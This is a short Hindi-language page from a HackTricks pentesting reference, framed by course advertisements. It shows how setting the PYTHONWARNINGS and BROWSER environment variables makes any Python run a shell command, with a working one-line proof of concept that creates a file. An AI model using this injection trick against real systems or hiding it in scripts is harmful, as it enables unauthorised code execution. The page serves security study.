# macOS Python एप्लिकेशन्स इंजेक्शन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## `PYTHONWARNINGS` और `BROWSER` एनवायरमेंट वेरिएबल के माध्यम से

यह संभव है कि जब कभी पायथन को कॉल किया जाता है, तो दोनों एनवायरमेंट वेरिएबल को बदला जा सकता है ताकि अर्बिट्रेरी कोड को निष्पादित किया जा सके, उदाहरण के लिए:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
```
{% endcode %}

{% hint style="success" %}
एडब्ल्यूएस हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण एडब्ल्यूएस रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
जीसीपी हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण जीसीपी रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में पीआर जमा करके।

</details>
{% endhint %}
